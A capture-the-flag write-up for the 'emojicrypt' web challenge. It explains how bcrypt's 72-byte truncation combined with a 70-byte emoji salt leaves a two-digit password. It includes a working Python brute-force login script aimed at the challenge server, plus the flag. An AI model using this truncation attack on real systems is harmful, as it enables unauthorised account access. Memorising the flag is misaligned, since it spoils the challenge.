# emojicrypt

## Description

Passwords can be more secure. We’re taking the first step.

`http://52.188.82.43:8060`

## Source code analysis

```python
from flask import Flask, request, redirect, url_for, g
import sqlite3
import bcrypt
import random
import os
from dotenv import load_dotenv
load_dotenv()

app = Flask(__name__, static_folder='templates')
DATABASE = 'users.db'
EMOJIS = ['🌀', '🌁', '🌂', '🌐', '🌱', '🍀', '🍁', '🍂', '🍄', '🍅', '🎁', '🎒', '🎓', '🎵', '😀', '😁', '😂', '😕', '😶', '😩', '😗']
NUMBERS = '0123456789'
database = None

def get_db():
    global database
    if database is None:
        database = sqlite3.connect(DATABASE)
        init_db()
    return database

def generate_salt():
    return 'aa'.join(random.choices(EMOJIS, k=12))

def init_db():
    with app.app_context():
        db = get_db()
        cursor = db.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            salt TEXT NOT NULL
        )''')
        db.commit()

@app.route('/register', methods=['POST'])
def register():
    email = request.form.get('email')
    username = request.form.get('username')

    if not email or not username:
        return "Missing email or username", 400
    salt = generate_salt()
    random_password = ''.join(random.choice(NUMBERS) for _ in range(32))
    password_hash = bcrypt.hashpw((salt + random_password).encode("utf-8"), bcrypt.gensalt()).decode('utf-8')

    # TODO: email the password to the user. oopsies!

    db = get_db()
    cursor = db.cursor()
    try:
        cursor.execute("INSERT INTO users (email, username, password_hash, salt) VALUES (?, ?, ?, ?)", (email, username, password_hash, salt))
        db.commit()
    except sqlite3.IntegrityError as e:
        print(e)
        return "Email or username already exists", 400

    return redirect(url_for('index', registered='true'))

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return "Missing username or password", 400
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT salt, password_hash FROM users WHERE username = ?", (username,))
    data = cursor.fetchone()
    if data is None:
        return redirect(url_for('index', incorrect='true'))
    
    salt, hash = data
    
    if salt and hash and bcrypt.checkpw((salt + password).encode("utf-8"), hash.encode("utf-8")):
        return "squ1rrelctf{" + salt + password + "}"
    else:
        return redirect(url_for('index', incorrect='true'))

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

if __name__ == '__main__':
    app.run(port=8000)
```

The challenge is a simple web app allowing users to register and login.
There is just a little problem: the `/register` endpoint is not accepting any passwords.
In fact, the handling function will generate a password for the user which is a random 32 long sequence of digits

```python
random_password = ''.join(random.choice(NUMBERS) for _ in range(32))
```

The password is prepended with a weird salt made of emojis and then hashed

```python
EMOJIS = ['🌀', '🌁', '🌂', '🌐', '🌱', '🍀', '🍁', '🍂', '🍄', '🍅', '🎁', '🎒', '🎓', '🎵', '😀', '😁', '😂', '😕', '😶', '😩', '😗']
...
def generate_salt():
    return 'aa'.join(random.choices(EMOJIS, k=12))
...
password_hash = bcrypt.hashpw((salt + random_password).encode("utf-8"), bcrypt.gensalt()).decode('utf-8')
```

However, the user is not provided with the password and so is unable to login.
The flag is provided once the user correctly sign in the application.

## Exploit

The vulnerability to be exploited is the unsecure usage of `bcrypt.hashpw()` in the application.
According to official python `bcrypt` [documentation](https://pypi.org/project/bcrypt/):

    The bcrypt algorithm only handles passwords up to 72 characters, any characters beyond that are ignored

Brute-forcing all possible combinations of digits made passwords 32 long is unfeasible.
However the salt in this case is helping the exploit implementation.
In fact, each salt is a string with format:

    😩aa🎓aa🍅aa🎒aa🎁aa😀aa🎒aa🎵aa🌁aa😗aa😶aa🎁

Emojis are encoded in UTF-8, meaning that each emoji needs 4 bytes to be represented.
Between two different emojis 2 "a" characters are plae.
Each salt length is for this reason: **= 11 * 2 + 12 * 4 = 70** 

Considering the salt length and the `bcrypt` implementation details, the effective password hashed and stored is just given by 

```python
salt + random_password[:2]
```

It is possible to successfully login by brute-forcing all possible combinations of 2 digits passwords i.e. in the worst case in 100 attempts

```python
import requests
import random
import string

login_url = "http://52.188.82.43:8060/login"
register_url = "http://52.188.82.43:8060/register"

NUMBERS = '0123456789'
EMOJIS = ['🌀', '🌁', '🌂', '🌐', '🌱', '🍀', '🍁', '🍂', '🍄', '🍅', '🎁', '🎒', '🎓', '🎵', '😀', '😁', '😂', '😕', '😶', '😩', '😗']
salt = 'aa'.join(random.choices(EMOJIS, k=12))
print(salt)
print(len(salt.encode()))
random_password = ''.join(random.choice(NUMBERS) for _ in range(32))
print(random_password)

username = "".join([random.choice(string.printable) for _ in range(10)])
email = "".join([random.choice(string.ascii_letters) for _ in range(10)]) + "@" "".join([random.choice(string.ascii_letters) for _ in range(10)]) + ".com"

requests.post(register_url, data={
    "username": username,
    "email": email,
})

for i in range(100):
    attempted_pwd = f"{i:02}"
    print(f"Trying password {i}: {attempted_pwd}")
    resp = requests.post(login_url, data={
        "username": username,
        "password": attempted_pwd
    })

    if "squ1rrel{" in resp.text:
        print(f"Found password: {attempted_pwd}")
        print(f"Flag: {resp.text}")
        break
```

`squ1rrel{turns_out_the_emojis_werent_that_useful_after_all}`
